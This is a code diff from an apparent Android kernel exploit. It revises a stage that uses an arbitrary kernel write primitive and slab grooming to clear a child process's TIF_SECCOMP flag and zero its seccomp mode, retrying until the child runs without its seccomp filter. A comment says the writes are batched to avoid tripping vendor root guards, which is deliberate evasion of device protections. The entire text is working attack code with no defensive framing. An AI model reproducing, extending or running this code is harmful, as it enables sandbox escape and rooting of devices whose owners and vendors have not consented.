@@ -901,8 +901,8 @@ int run_exploit(int argc, char **argv) {
 
     /* W3: clear the child's seccomp filter for the late-load worker
      * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
-     * must be zeroed too; zeroing mode with the flag still set BUG()s, hence
-     * the direct probe first: cleared -> normal errno, active -> SIGSYS.
+     * must be zeroed too; do both writes back-to-back with one probe
+     * (real finit_module calls trip vendor root guards).
      * Leaf writes land on [target] or [target+8]; a comm probe picks the side
      * before targeting thread_info.flags (task+0) / seccomp.mode. */
     if (!process_has_seccomp()) {
@@ -925,53 +925,43 @@ int run_exploit(int argc, char **argv) {
     uintptr_t flags_target = w3_context.leaf_to_target8
       ? child_task - 8
       : child_task + TASK_THREAD_INFO_FLAGS_OFF;
+    uintptr_t mode_target = w3_context.leaf_to_target8
+      ? child_task + TASK_SECCOMP_OFF - 8
+      : child_task + TASK_SECCOMP_OFF;
 
-    int w3a_ok = 0;
     for (int attempt = 1; attempt <= 6; attempt++) {
-      pr_info("W3a: TIF_SECCOMP attempt %d/6\n", attempt);
+      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
       if (attempt == 1) slab_drain();
       int routed = do_one_write(flags_target, "W3a: TIF_SECCOMP", 1, 1);
       if (!routed) {
-        pr_warning("W3a attempt %d route failed; backing off\n", attempt);
+        pr_warning("W3 attempt %d route failed; backing off\n", attempt);
         usleep(100000);
         continue;
       }
       usleep(50000);
-      if (verify_w3a_direct_stage(&w2_context)) {
-        w3a_ok = 1;
-        break;
+      routed = do_one_write(mode_target, "W3b: seccomp mode", 1, 1);
+      if (!routed) {
+        pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
+        usleep(100000);
+        continue;
       }
+      usleep(50000);
       int st = 0;
       if (waitpid(child, &st, WNOHANG) == child) {
-        pr_warning("W3a lost the child (status=0x%x); chain will retry\n", st);
+        pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
         child_alive = 0;
+        break;
+      }
+      if (verify_seccomp_probe_stage(&w2_context)) {
+        seccomp_ok = 1;
         break;
       }
       usleep(50000);
     }
 
-    if (!w3a_ok) {
-      pr_warning("W3 TIF_SECCOMP clear failed; ksud late-load will likely stay blocked\n");
-      continue; /* respawn and redo the chain */
-    }
-
-    pr_success("W3a: child TIF_SECCOMP cleared\n");
-    /* Forked probe mirrors the late-load worker; zero mode (W3b) and
-     * re-probe if it still hits the filter. */
-    seccomp_ok = verify_seccomp_probe_stage(&w2_context);
     if (!seccomp_ok) {
-      uintptr_t mode_target = w3_context.leaf_to_target8
-        ? child_task + TASK_SECCOMP_OFF - 8
-        : child_task + TASK_SECCOMP_OFF;
-      /* Vendor TASK_SECCOMP_OFF may point at the filter slot; the fork probe
-       * verifies the result either way. */
-      seccomp_ok = retry_write_stage(
-          "W3b: seccomp mode", mode_target, 1, 4, 50000,
-          verify_seccomp_probe_stage, &w2_context, 1);
-      if (!seccomp_ok) {
-        pr_warning("W3b seccomp clear or final probe failed; chain will retry\n");
-        continue;
-      }
+      pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
+      continue; /* respawn and redo the chain */
     }
     pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
     break;
